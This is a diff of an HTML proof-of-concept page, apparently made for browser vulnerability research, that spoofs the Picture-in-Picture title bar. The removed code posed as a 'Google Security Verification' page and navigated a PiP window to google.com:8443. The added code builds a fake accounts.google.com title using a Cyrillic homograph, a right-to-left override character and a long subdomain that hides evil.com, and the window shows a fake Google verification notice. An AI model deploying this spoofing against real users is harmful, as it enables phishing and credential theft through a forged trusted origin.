@@ -5,73 +5,55 @@
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>Google Security Verification</title>
 <style>
-  * { margin: 0; padding: 0; box-sizing: border-box; }
-  body { background: #f4f4f4; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; text-align: center; }
-  .panel { background: #fff; padding: 40px; border-radius: 12px; box-shadow: 0 4px 20px rgba(0,0,0,0.1); max-width: 400px; width: 100%; }
-  h2 { color: #4285f4; margin-bottom: 10px; }
-  p { color: #666; font-size: 14px; margin-bottom: 20px; }
-  button { padding: 15px 30px; background: #1a73e8; color: #fff; border: none; border-radius: 8px; font-size: 16px; font-weight: bold; cursor: pointer; width: 100%; }
-  button:hover { background: #1557b0; }
-  #status { margin-top: 20px; font-family: monospace; font-size: 12px; color: #666; }
+  body { font-family: sans-serif; padding: 40px; text-align: center; }
+  button { padding: 15px 30px; font-size: 18px; cursor: pointer; }
 </style>
 </head>
 <body>
 
-<div class="panel" id="main-card">
-  <h2>🔒 Google Security Verification</h2>
-  <p>Klik tombol di bawah untuk memverifikasi akun Google Anda. Anda akan diarahkan ke server aman Google (port 8443).</p>
-  <button id="startBtn">Verify Account</button>
-  <div id="status">[*] Ready...</div>
-</div>
+<h2>PiP Title Bar Spoofing (Combined)</h2>
+<p>Klik tombol di bawah. Perhatikan title bar PiP.</p>
+<button id="startBtn">Open Spoofed PiP</button>
 
 <script>
 (function () {
   'use strict';
 
   var btn = document.getElementById('startBtn');
-  var statusEl = document.getElementById('status');
 
-  function log(msg) {
-    statusEl.textContent = msg;
-    console.log("[PiP Delay] " + msg);
-  }
-
-  // ============================================
-  // 1. TRIGGER (KLIK)
-  // ============================================
   btn.addEventListener('click', async function() {
-    log("[*] Memulai PiP navigation + delay...");
-
     try {
       if (!window.documentPictureInPicture) {
         alert("Document Picture-in-Picture tidak didukung.");
         return;
       }
 
-      // ============================================
-      // 2. BUKA PiP & NAVIGASI KE GOOGLE:8443
-      // ============================================
       const pipWindow = await documentPictureInPicture.requestWindow({
-        width: 500,
-        height: 600
+        width: 400,
+        height: 300
       });
 
-      // Navigasi PiP ke google.com:8443 (pending)
-      pipWindow.location.href = 'https://www.google.com:8443';
-
-      log('PiP navigated to google.com:8443 (pending).');
-
       // ============================================
-      // 3. REDIRECT PARENT KE GOOGLE ASLI (OPSIONAL)
+      // COMBINED SPOOFING
       // ============================================
-      // Setelah 1 detik, redirect parent ke Google asli.
-      setTimeout(function() {
-        log('Redirecting parent to google.com...');
-        window.location.replace('https://www.google.com');
-      }, 1000);
+      // 1. Homograph: Cyrillic 'е' (U+0435)
+      // 2. RTLO: U+202E untuk membalik teks
+      // 3. Panjang subdomain: untuk menyembunyikan domain asli
+      
+      var spoofedTitle = "accounts.google.com \u202E moc.elgoog\u0435.stnuocca.very-long-subdomain-to-hide-real-domain.evil.com";
+      
+      pipWindow.document.title = spoofedTitle;
+
+      pipWindow.document.body.innerHTML = `
+        <div style="font-family:sans-serif;text-align:center;padding:20px;">
+          <h3>Google Security Verification</h3>
+          <p>This PiP window is spoofing the title bar with combined techniques.</p>
+          <p style="color:#666;font-size:12px;">Check the title bar above.</p>
+        </div>
+      `;
 
     } catch (e) {
-      log('Error: ' + e.message);
+      alert('Error: ' + e.message);
     }
   }, { once: true });
 
